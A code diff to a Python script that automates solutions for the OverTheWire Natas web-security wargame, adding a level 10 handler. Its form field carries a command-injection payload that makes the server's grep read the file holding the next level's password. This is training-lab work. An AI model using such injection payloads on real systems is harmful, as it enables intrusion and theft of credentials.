@@ -2,10 +2,9 @@ import os
 import re
 import requests
 import base64 # for level 8
-import html # for level 8
 
 PASSWORD_FILE = "natas_passwords"
-MAX_LEVEL = 10
+MAX_LEVEL = 11
 
 
 # INIT PASSWORD FILE
@@ -130,8 +129,17 @@ def get_level_9_data(password):
         "submit": "Submit Query"
     }
     
-# LEVEL SPECIFIC DATA
-
+def get_level_10_data(password):
+    url = "http://natas10.natas.labs.overthewire.org/index-source.html"
+    r = requests.get(url, auth=("natas10", password))
+    
+    return {
+        "needle": ". /etc/natas_webpass/natas11 #",
+        "submit": "Submit Query"
+    }
+    
+    
+# LEVEL-SPECIFIC DATA
 LEVELS = {
     0: {
         "solver": solve_level_A,
@@ -184,6 +192,12 @@ LEVELS = {
         "path": "/",
         "method": "POST",
         "data_foo": get_level_9_data
+    },
+    10: {
+        "solver": solve_level_B,
+        "path": "/",
+        "method": "POST",
+        "data_foo": get_level_10_data
     }
 }
 
